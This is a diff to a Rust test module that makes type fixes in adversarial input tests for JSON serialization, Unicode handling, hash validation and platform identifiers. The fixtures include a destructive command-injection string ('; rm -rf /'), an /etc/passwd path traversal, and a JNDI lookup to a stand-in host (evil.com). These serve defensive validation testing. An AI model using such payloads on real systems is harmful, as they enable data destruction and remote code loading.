@@ -2171,6 +2171,7 @@ mod tests {
     #[test]
     fn negative_json_serialization_attacks_with_escape_sequence_injection() {
         // Test JSON serialization with content designed to break parsing
+        let large_backslash_payload = "\\".repeat(100000);
         let injection_payloads = vec![
             // JSON structure injection attempts
             r#"","malicious":"payload","hijacked":"#,
@@ -2181,7 +2182,7 @@ mod tests {
             // Control character injection
             "\x00\x01\x02\":{\"evil\":true}//\x03\x04",
             // Large payload injection
-            &"\\".repeat(100000),
+            large_backslash_payload.as_str(),
             // Number-like strings
             "1.7976931348623157e+308",
             "-0",
@@ -2725,6 +2726,7 @@ mod tests {
     #[test]
     fn negative_capsule_comprehensive_unicode_injection_and_metadata_attacks() {
         // Test comprehensive Unicode injection and metadata attack resistance
+        let path_traversal_pattern = format!("../../../{}", "x".repeat(1000));
         let malicious_unicode_patterns = [
             "\u{202E}\u{202D}fake_capsule\u{202C}", // Right-to-left override
             "capsule\u{000A}\u{000D}injected\x00nulls", // CRLF + null injection
@@ -2734,7 +2736,7 @@ mod tests {
             "\u{FFFF}\u{FFFE}\u{FDD0}non_characters", // Non-character code points
             "🎬🔄\u{1F4A5}💥\u{1F52B}🔫",           // Complex emoji sequences
             "\u{0300}\u{0301}\u{0302}combining_marks", // Combining marks
-            format!("../../../{}", "x".repeat(1000)), // Path traversal + long string
+            path_traversal_pattern.as_str(), // Path traversal + long string
             "capsule\x00\x01\x02\x03\x04\x05hidden", // Binary injection
         ];
 
@@ -3748,8 +3750,8 @@ mod tests {
             // Command injection style
             format!("{}; rm -rf /", "a".repeat(32)),
             // Hash collision attempt patterns
-            "0000000000000000000000000000000000000000000000000000000000000000",
-            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
+            "0000000000000000000000000000000000000000000000000000000000000000".to_string(),
+            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff".to_string(),
             // Known weak hash patterns
             "1234567890abcdef".repeat(4),
             // Repeating patterns
@@ -4349,13 +4351,13 @@ mod tests {
 
             // Attack 2: Malformed hash strings to test validation
             let malformed_hashes = vec![
-                "not_a_valid_hex_hash",
-                "deadbeef",      // Too short
-                "g".repeat(64),  // Invalid hex characters
-                "A".repeat(63),  // One character short
-                "B".repeat(65),  // One character too long
-                "",              // Empty hash
-                "🦀".repeat(16), // Unicode in hash
+                "not_a_valid_hex_hash".to_string(),
+                "deadbeef".to_string(), // Too short
+                "g".repeat(64),         // Invalid hex characters
+                "A".repeat(63),         // One character short
+                "B".repeat(65),         // One character too long
+                "".to_string(),         // Empty hash
+                "🦀".repeat(16),        // Unicode in hash
             ];
 
             for (i, malformed_hash) in malformed_hashes.iter().enumerate() {
@@ -4426,13 +4428,13 @@ mod tests {
         fn test_environment_snapshot_tampering_and_injection_attacks() {
             // Attack 1: Platform identifier injection attacks
             let malicious_platforms = vec![
-                "../../../etc/passwd",
-                "${jndi:ldap://evil.com}",
-                "linux-x86_64\x00\x01injection",
-                "windows\r\ninjected_line",
+                "../../../etc/passwd".to_string(),
+                "${jndi:ldap://evil.com}".to_string(),
+                "linux-x86_64\x00\x01injection".to_string(),
+                "windows\r\ninjected_line".to_string(),
                 "very_long_platform_name_".repeat(100),
-                "🦀_platform_with_emoji",
-                "", // Empty platform
+                "🦀_platform_with_emoji".to_string(),
+                "".to_string(), // Empty platform
             ];
 
             for (i, platform) in malicious_platforms.iter().enumerate() {
